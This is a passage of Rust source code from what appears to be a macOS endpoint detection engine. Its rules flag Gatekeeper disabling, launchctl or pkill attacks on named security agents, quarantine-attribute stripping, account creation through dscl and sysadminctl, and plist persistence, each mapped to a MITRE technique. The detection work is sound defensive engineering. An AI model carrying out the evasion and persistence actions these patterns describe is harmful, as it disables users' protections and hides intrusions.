                "pkgutil expanding package from Downloads",
            )
        } else if is_xcodebuild_suspicious {
            (
                "xcodebuild_suspicious_parent",
                "xcodebuild invoked from interpreter or Downloads-origin chain",
            )
        } else {
            continue;
        };

        let mut details = json!({
            "pid": process.pid,
            "ppid": process.ppid,
            "command": process.command,
            "args": process.args,
            "process_kind": process.process_kind,
            "parent_command": process.parent_command,
            "parent_process_kind": process.parent_process_kind,
            "trigger": trigger,
            "mitre_technique": "T1218",
            "confidence": "medium",
        });
        merge_chain_details(&mut details, chain_details(process.pid, ctx));

        alerts.push(build_alert(
            ctx.now,
            "alert_signed_binary_proxy_execution",
            AlertSeverity::High,
            "defense_evasion",
            reason,
            details,
        ));
    }

    alerts
}

// ─── Security tool disabling (T1562.001) ──────────────────────────────────────

fn detect_security_tool_tampering(ctx: &DetectionContext) -> Vec<TelemetryEvent> {
    let mut alerts = Vec::new();

    for process in &ctx.recent_processes {
        let cmd_basename = Path::new(&process.command)
            .file_name()
            .and_then(|n| n.to_str())
            .unwrap_or("")
            .to_ascii_lowercase();
        let args_lower = process.args.to_ascii_lowercase();

        // spctl --disable or spctl --master-disable — disables Gatekeeper.
        let is_gatekeeper_disable = cmd_basename == "spctl"
            && (args_lower.contains("--disable") || args_lower.contains("--master-disable"));

        // launchctl unload/stop targeting known security agents.
        let security_agent_patterns = [
            "com.apple.security",
            "com.apple.xprotect",
            "com.apple.mrt",
            "com.apple.syspolicyd",
            "com.apple.trustd",
            "sentinelone",
            "crowdstrike",
            "carbonblack",
            "malwarebytes",
        ];
        let is_launchctl_kill_security = cmd_basename == "launchctl"
            && (args_lower.contains("unload") || args_lower.contains("stop") || args_lower.contains("disable"))
            && security_agent_patterns.iter().any(|pat| args_lower.contains(pat));

        // pkill / killall targeting known security tool process names.
        let security_process_names = [
            "santad", "SentinelAgent", "falcon", "cbsensor",
            "MalwareBytes", "XProtect", "syspolicyd", "trustd",
        ];
        let is_kill_security_tool = (cmd_basename == "pkill" || cmd_basename == "killall")
            && security_process_names.iter().any(|name| args_lower.contains(&name.to_lowercase()));

        // xattr removing quarantine attribute in bulk from non-interactive shell.
        let is_bulk_xattr_quarantine_strip = cmd_basename == "xattr"
            && args_lower.contains("-d")
            && args_lower.contains("com.apple.quarantine")
            && (process.parent_process_kind.as_deref() == Some("interpreter")
                || process.behavior.references_downloads_path);

        let (trigger, severity, reason) = if is_gatekeeper_disable {
            (
                "spctl_gatekeeper_disable",
                AlertSeverity::Critical,
                "Gatekeeper disabled via spctl — code signing enforcement removed",
            )
        } else if is_launchctl_kill_security {
            (
                "launchctl_kill_security_agent",
                AlertSeverity::Critical,
                "launchctl unloading or stopping a macOS security agent",
            )
        } else if is_kill_security_tool {
            (
                "pkill_security_tool",
                AlertSeverity::High,
                "Security tool process targeted with pkill/killall",
            )
        } else if is_bulk_xattr_quarantine_strip {
            (
                "xattr_quarantine_strip",
                AlertSeverity::High,
                "xattr stripping quarantine attribute from Downloads content via interpreter chain",
            )
        } else {
            continue;
        };

        let mut details = json!({
            "pid": process.pid,
            "ppid": process.ppid,
            "command": process.command,
            "args": process.args,
            "process_kind": process.process_kind,
            "parent_command": process.parent_command,
            "parent_process_kind": process.parent_process_kind,
            "trigger": trigger,
            "mitre_technique": "T1562.001",
            "confidence": "high",
        });
        merge_chain_details(&mut details, chain_details(process.pid, ctx));

        alerts.push(build_alert(
            ctx.now,
            "alert_security_tool_tampering",
            severity,
            "defense_evasion",
            reason,
            details,
        ));
    }

    alerts
}

// ─── Valid account / account manipulation (T1078, T1136) ──────────────────────

fn detect_account_manipulation(ctx: &DetectionContext) -> Vec<TelemetryEvent> {
    let mut alerts = Vec::new();

    for process in &ctx.recent_processes {
        let cmd_basename = Path::new(&process.command)
            .file_name()
            .and_then(|n| n.to_str())
            .unwrap_or("")
            .to_ascii_lowercase();
        let args_lower = process.args.to_ascii_lowercase();

        // dscl creating or modifying user accounts or adding to admin group.
        let is_dscl_user_create = cmd_basename == "dscl"
            && (args_lower.contains("-create")
                || args_lower.contains("-append")
                || args_lower.contains("-merge"))
            && (args_lower.contains("/users/")
                || args_lower.contains("groupmembership")
                || args_lower.contains("admin"));

        // sysadminctl -addUser or -admin: adds a new user.
        let is_sysadminctl_adduser = cmd_basename == "sysadminctl"
            && (args_lower.contains("-adduser")
                || args_lower.contains("-admin")
                || args_lower.contains("-securetoken"));

        // passwd invoked by a non-system, non-interactive process.
        let is_suspicious_passwd = cmd_basename == "passwd"
            && !matches!(
                process.parent_process_kind.as_deref(),
                Some("system") | Some("user_app")
            )
            && (process.parent_process_kind.as_deref() == Some("interpreter")
                || process.command_path_kind == "downloads"
                || process.behavior.references_downloads_path);

        // su / login invoked from an interpreter chain — possible lateral move or pivot.
        let is_su_from_interpreter = (cmd_basename == "su" || cmd_basename == "login")
            && matches!(
                process.parent_process_kind.as_deref(),
                Some("interpreter") | Some("unknown")
            );

        let (trigger, mitre, reason) = if is_dscl_user_create {
            ("dscl_user_create", "T1136.001", "dscl creating or modifying a local user account")
        } else if is_sysadminctl_adduser {
            ("sysadminctl_adduser", "T1136.001", "sysadminctl adding a new user or granting admin privileges")
        } else if is_suspicious_passwd {
            ("suspicious_passwd", "T1078", "passwd invoked from interpreter chain — possible credential manipulation")
        } else if is_su_from_interpreter {
            ("su_from_interpreter", "T1078", "su/login invoked from interpreter chain — possible account pivoting")
        } else {
            continue;
        };

        // Suppress if clearly invoked interactively by a human user session (Terminal parent).
        if process.parent_command.as_deref().map(|c| c.to_ascii_lowercase()).as_deref()
            .map(|c| c.contains("terminal") || c.contains("iterm"))
            .unwrap_or(false)
            && !process.behavior.references_downloads_path
        {
            continue;
        }

        let mut details = json!({
            "pid": process.pid,
            "ppid": process.ppid,
            "command": process.command,
            "args": process.args,
            "process_kind": process.process_kind,
            "parent_command": process.parent_command,
            "parent_process_kind": process.parent_process_kind,
            "trigger": trigger,
            "mitre_technique": mitre,
            "confidence": "medium",
        });
        merge_chain_details(&mut details, chain_details(process.pid, ctx));

        alerts.push(build_alert(
            ctx.now,
            "alert_account_manipulation",
            AlertSeverity::High,
            "persistence",
            reason,
            details,
        ));
    }

    alerts
}

// ─── Plist modification (T1547.011) ───────────────────────────────────────────

fn detect_plist_modification(ctx: &DetectionContext) -> Vec<TelemetryEvent> {
    let mut alerts = Vec::new();

    for process in &ctx.recent_processes {
        // PlistBuddy, defaults, and plutil are system-kind tools; don't skip them.
        // The detection logic relies on args/parent to distinguish malicious use.
        if process.process_kind == "browser" {
            continue;
        }

        let cmd_basename = Path::new(&process.command)
            .file_name()
            .and_then(|n| n.to_str())
            .unwrap_or("")
            .to_ascii_lowercase();
        let args_lower = process.args.to_ascii_lowercase();

        // PlistBuddy writing to a persistence plist path.
        let plist_persistence_paths = [
            "/library/launchagents/",
            "/library/launchdaemons/",
            "/library/startupitems/",
            "loginwindow",
            "com.apple.loginwindow",
        ];
        let is_plistbuddy_persistence = cmd_basename == "plistbuddy"
            && args_lower.contains(":set")
            && plist_persistence_paths.iter().any(|p| args_lower.contains(p));

        // defaults write to persistence-relevant domains.
        let persistence_defaults_domains = [
            "com.apple.loginwindow",
            "loginwindow",
            "com.apple.launchservices",
            "com.apple.dock",
        ];
        let is_defaults_persistence = cmd_basename == "defaults"
            && args_lower.contains("write")
            && persistence_defaults_domains.iter().any(|d| args_lower.contains(d))
            && !matches!(
                process.parent_process_kind.as_deref(),
                Some("system") | Some("user_app")
            );

        // plutil converting or modifying a plist in a persistence location.
        let is_plutil_persistence = cmd_basename == "plutil"
            && (args_lower.contains("-replace") || args_lower.contains("-insert"))
            && plist_persistence_paths.iter().any(|p| args_lower.contains(p));

        // Direct plist file events in LaunchAgents/LaunchDaemons (higher confidence from process side).
        let is_indirect_plist_write = (cmd_basename == "cp" || cmd_basename == "mv" || cmd_basename == "install")
            && plist_persistence_paths
                .iter()
                .any(|p| args_lower.contains(p))
            && (process.behavior.references_downloads_path
                || process.parent_process_kind.as_deref() == Some("interpreter"));

        let (trigger, reason) = if is_plistbuddy_persistence {
            (
                "plistbuddy_persistence",
                "PlistBuddy modifying a persistence-domain plist",
            )
        } else if is_defaults_persistence {
            (
                "defaults_write_persistence",
                "defaults write modifying a persistence-relevant domain from non-system process",
            )
        } else if is_plutil_persistence {
            (
                "plutil_persistence",
                "plutil modifying a plist in a persistence path",
            )
        } else if is_indirect_plist_write {
            (
                "cp_mv_plist_to_persistence",
                "File copied/moved into LaunchAgents or LaunchDaemons from interpreter chain",
            )
        } else {
            continue;
        };

        let severity = if args_lower.contains("/library/launchdaemons/")
            || args_lower.contains("loginwindow")
        {
            AlertSeverity::High
        } else {
            AlertSeverity::Medium
        };

        let mut details = json!({
            "pid": process.pid,
            "ppid": process.ppid,
            "command": process.command,
            "args": process.args,
            "process_kind": process.process_kind,
            "parent_command": process.parent_command,
            "parent_process_kind": process.parent_process_kind,
            "trigger": trigger,
            "mitre_technique": "T1547.011",
            "confidence": "medium",
        });
        merge_chain_details(&mut details, chain_details(process.pid, ctx));

        alerts.push(build_alert(
            ctx.now,
            "alert_plist_modification",
            severity,
            "persistence",
            reason,
            details,
        ));
    }

    alerts
}

fn detect_double_extension_execution(ctx: &DetectionContext) -> Vec<TelemetryEvent> {
    let cutoff = ctx.now - Duration::seconds(120);
    let mut detections = Vec::new();

    for event in &ctx.recent_file_events {
        if event.timestamp < cutoff {
            continue;
        }

        if !has_double_extension(&event.path) {
            continue;
        }

        // Derive the decoy and real extensions for the alert payload
        let lower = event.path.to_ascii_lowercase();
        let (decoy_ext, real_ext) = if let Some(last_dot) = lower.rfind('.') {
            let real = lower[last_dot + 1..].to_string();
            let stem = &lower[..last_dot];
            let decoy = if let Some(prev_dot) = stem.rfind('.') {
                stem[prev_dot + 1..].to_string()
            } else {
                String::new()
            };
            (decoy, real)
        } else {
            (String::new(), String::new())
        };

        let severity = if event.path.contains("/Downloads/") || event.is_executable {
            AlertSeverity::High
        } else {
            AlertSeverity::Medium
        };

        detections.push(build_alert(
            ctx.now,
            "alert_double_extension_execution",
            severity,
            "masquerading",
            "A file has a double extension pattern suggesting deliberate type disguising",
            json!({
                "path": event.path,
                "decoy_extension": decoy_ext,
                "real_extension": real_ext,
                "event_kind": event.kind,
                "is_executable": event.is_executable,
                "in_downloads": event.path.contains("/Downloads/"),
                "mitre_technique": "T1036",
            }),
        ));
    }

    detections
}